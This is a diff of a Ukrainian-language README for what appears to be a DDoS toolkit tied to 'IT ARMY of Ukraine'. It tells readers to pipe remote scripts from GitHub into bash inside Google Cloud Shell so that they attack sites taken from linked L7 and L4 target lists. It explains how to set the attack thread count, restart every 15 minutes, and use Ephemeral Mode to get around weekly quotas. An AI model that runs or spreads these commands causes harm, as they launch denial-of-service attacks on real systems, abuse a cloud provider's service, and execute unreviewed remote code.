@@ -18,20 +18,20 @@ curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos
 curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/Start_dualShell.sh | bash
 ```
 #
-У GCloudShell https://shell.cloud.google.com/?fromcloudshell=true&show=terminal в налаштуваннях вимикаємо статистику використання.
+У [Google Cloud Shell](https://shell.cloud.google.com/?fromcloudshell=true&show=terminal) в налаштуваннях бажано **вимкнути** статистику використання.
 Дозволяється запускати до 4 терміналів на 1 акаунт але доцільніше використовувати 1-2 термінали на акаунт.
 Також враховуйте, що встановлені тижневі квоти на використання, 1 акаунт - 50 годин у звичайному режимі та 50 годин у ефемерному режимі (до закінчення квоти у звичайному режимі - вмикаємо Ephemeral Mode (ставимо - "Завжди") та отримуємо ще 50 годин використання на поточний тиждень)
 #
-##### Перезапуск скрипту кожні 15 хв, метод атаки додається зі списку цілей, параметр -t за замовчуванням 1000. За потреби параметр -t можна змінити додавши до команди ` -s -- "кількість"`, наприклад:
+:white_check_mark: **Перезапуск скрипту кожні 15 хв, метод атаки додається зі списку цілей, параметр -t за замовчуванням 1000. За потреби параметр -t можна змінити додавши до команди ` -s -- "кількість"`, наприклад:**
 ```
 curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/Start_L7m.sh | bash -s -- 2000
 ```
 #
-####Списки з цілями
+#### Списки з цілями
 
 https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L7m.lst
 
 https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L4t.lst
 
 #
-IT ARMY of Ukraine
+[IT ARMY of Ukraine](https://t.me/itarmyofukraine2022)
